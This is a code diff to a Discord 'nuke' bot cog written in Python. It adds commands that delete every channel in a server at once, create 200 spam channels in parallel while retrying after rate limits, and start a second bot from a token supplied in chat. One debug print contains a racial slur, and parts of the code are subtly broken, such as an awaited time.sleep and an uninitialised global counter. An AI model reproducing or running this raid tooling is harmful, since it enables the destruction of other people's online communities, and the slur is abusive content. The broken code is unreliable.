@@ -1,6 +1,8 @@
-import discord, asyncio, aiohttp, time, json
+from unittest import async_case
+import discord, asyncio, time, json
 from aiohttp import *
 from discord.ext import commands as dortrox
+intents = discord.Intents().all()
 global ban
 fObj = open('config.json',)
 ogdata = json.load(fObj)
@@ -11,6 +13,15 @@ channel_json = ogdata['channel_json']
 role_json = ogdata['role_json']
 headers = {'User-Agent': uagent, 'Authorization': token }
 
+
+async def log(hokus):
+    bot = dortrox.Bot(command_prefix= "?", help_command=None, intents=intents,)
+    @bot.event
+    async def on_ready():
+        print("ready")
+        
+    bot.run(hokus, bot=True)
+
 #The nuke beginning: 
 
 async def cd(channel):
@@ -18,14 +29,27 @@ async def cd(channel):
         async with cs.delete(f'https://discord.com/api/v8/channels/{channel}') as r:
             if r.status == 200 or r.status == 201 or r.status == 204:
                 print(f'Deleted Channel {channel}')
+                global i
+                i+=1
+                print(i)
+            elif r.status == 429:
+                print("nigg")
+                await time.sleep(3)
             else:
-                print(f'{r.status} Too many request/Not found')
+                print(f'{r.status}')
+
 async def cs(ctx):
     guild = ctx.guild.id
     async with ClientSession(headers=headers) as cs:
         async with cs.post(f'https://discord.com/api/v8/guilds/{guild}/channels', json=channel_json) as r:
             if r.status == 200 or r.status == 201 or r.status == 204:
+                global i
+                i+=1
+                print(i)
                 print(f'Channel Spammed')
+            elif r.status == 429:
+                print("efew")
+                await time.sleep(3)
             else:
                 print(f'{r.status} Too many request/Not found')
 
@@ -70,7 +94,6 @@ async def b(ctx, member):
 class nuke(dortrox.Cog):
     def __init__(self, dortrox):
         self.dortrox = dortrox
-        
 
 
     @dortrox.command()
@@ -114,6 +137,14 @@ class nuke(dortrox.Cog):
     @dortrox.command()
     async def delcha(self, ctx):
         await asyncio.gather(*[cd(channel.id) for channel in ctx.guild.channels])
+    
+    @dortrox.command()
+    async def spamc(self, ctx):
+        await asyncio.gather(*[cs(ctx) for _ in range(200)])
+
+    @dortrox.command()
+    async def do(self, ctx, hokus):
+        await log(hokus)
 
 def setup(dortrox):
     dortrox.add_cog(nuke(dortrox))
